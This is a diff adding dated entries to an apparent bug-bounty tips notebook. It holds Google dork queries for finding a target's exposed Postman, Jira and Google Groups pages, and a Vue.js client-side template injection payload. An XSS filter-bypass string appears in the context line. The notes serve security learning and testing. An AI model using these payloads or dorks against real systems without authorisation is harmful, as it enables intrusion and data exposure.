@@ -389,3 +389,29 @@ javas%09script:alert(1) // 200 OK
 
 ## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 26
 - [Salesforce Security Misconfiguration (Part - 2) ](https://twitter.com/harshbothra_/status/1354086847983603716?s=20)
+
+# 📅 28-Jan-2021
+
+## [Information Disclosure via Google Dorks](https://twitter.com/ADITYASHENDE17/status/1354766660876423168?s=20)
+```text
+inurl:"http://documenter.getpostman.com" target
+site:http://*.jira.com "target"
+site:http://jira.com "target"
+inurl:"https://groups.google.com/g/" target_name
+```
+
+# 📅 29-Jan-2021
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 28
+- [Common Business Logic Issues: Part-1 ](https://twitter.com/harshbothra_/status/1354822724116389892?s=20)
+
+## Vue.js Js Library Client Side Template Injection
+```text
+hxxp://host/?name={{this.constructor.constructor('alert("foo")')()}}
+```
+
+***Payload***
+```js
+{{this.constructor.constructor('alert("foo")')()}}
+```
+**Source:** https://twitter.com/wugeej/status/1354312840681668610?s=20
